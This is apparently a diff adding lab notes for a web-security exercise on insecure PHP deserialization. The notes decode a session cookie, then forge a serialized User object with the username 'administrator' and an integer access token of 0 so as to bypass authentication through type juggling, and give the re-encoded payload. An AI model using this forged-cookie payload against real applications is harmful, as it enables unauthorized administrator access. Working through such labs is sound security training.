@@ -1,0 +1,15 @@
+Original Cookie:
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJidDVzZXVkczU1NzY1MTRwMGVyc21hbHNid243ZGdoaiI7fQ%3d%3d
+	
+Cookie After URL Decoding:
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJidDVzZXVkczU1NzY1MTRwMGVyc21hbHNid243ZGdoaiI7fQ==
+
+Cookie After Base 64 Decoding:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bt5seuds5576514p0ersmalsbwn7dghj";}
+
+Serialized Object After Changing String Value And Length As Well As Access Token Type And Value:
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
+Serialized Object After Base64 Encoding:
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
+
